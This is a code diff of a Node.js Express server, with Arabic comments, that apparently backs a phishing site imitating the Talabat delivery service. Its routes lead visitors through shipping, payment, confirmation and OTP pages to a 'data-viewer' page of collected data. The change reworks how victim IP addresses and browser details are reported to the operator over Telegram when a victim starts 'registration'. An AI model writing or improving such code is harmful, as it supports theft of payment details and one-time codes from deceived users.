@@ -41,21 +41,20 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// ========== دالة إرسال إشعار الزيارة ==========
-async function sendVisitNotification(page, ip, userAgent) {
+// ========== دالة إرسال إشعار بدء التسجيل ==========
+async function sendStartNotification(ip, userAgent) {
     try {
-        let msg = `👁️ <b>زيارة جديدة للموقع - Talabat</b>\n`;
+        let msg = `🟢 <b>عميل جديد بدأ التسجيل!</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `📄 الصفحة: ${page}\n`;
         msg += `🌐 IP: ${ip || 'غير معروف'}\n`;
         msg += `💻 المتصفح: ${userAgent || 'غير معروف'}\n\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض البيانات</a>`;
+        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
         
         await sendTelegramMessage(msg);
     } catch (e) {
-        console.error('❌ خطأ في إرسال إشعار الزيارة:', e.message);
+        console.error('❌ خطأ في إرسال إشعار بدء التسجيل:', e.message);
     }
 }
 
@@ -127,46 +126,37 @@ let lastFetchTime = 0;
 
 // ========== المسارات ==========
 app.get('/', (req, res) => {
-    // إرسال إشعار الزيارة
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    sendVisitNotification('الصفحة الرئيسية 🏠', ip, userAgent);
     res.sendFile(path.join(__dirname, 'views', 'page1.html'));
 });
 
+// ========== مسار page2 مع إشعار بدء التسجيل ==========
 app.get('/page2', (req, res) => {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    sendVisitNotification('صفحة الشحن 📦', ip, userAgent);
+    // لو في notify=true في الرابط، نبعت إشعار
+    if (req.query.notify === 'true') {
+        const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
+                   req.headers['x-real-ip'] || 
+                   req.socket.remoteAddress || 
+                   'غير معروف';
+        const userAgent = req.headers['user-agent'] || 'غير معروف';
+        sendStartNotification(ip, userAgent);
+    }
     res.sendFile(path.join(__dirname, 'views', 'page2.html'));
 });
 
 app.get('/page3', (req, res) => {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    sendVisitNotification('صفحة الدفع 💳', ip, userAgent);
     res.sendFile(path.join(__dirname, 'views', 'page3.html'));
 });
 
 app.get('/page4', (req, res) => {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    sendVisitNotification('صفحة التأكيد 🔐', ip, userAgent);
     res.sendFile(path.join(__dirname, 'views', 'page4.html'));
 });
 
 app.get('/page5', (req, res) => {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    sendVisitNotification('صفحة OTP 📱', ip, userAgent);
     res.sendFile(path.join(__dirname, 'views', 'page5.html'));
 });
 
 // ========== صفحة عرض البيانات ==========
 app.get('/data-viewer', (req, res) => {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'غير معروف';
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    sendVisitNotification('عرض البيانات 📊', ip, userAgent);
     res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
 });
 
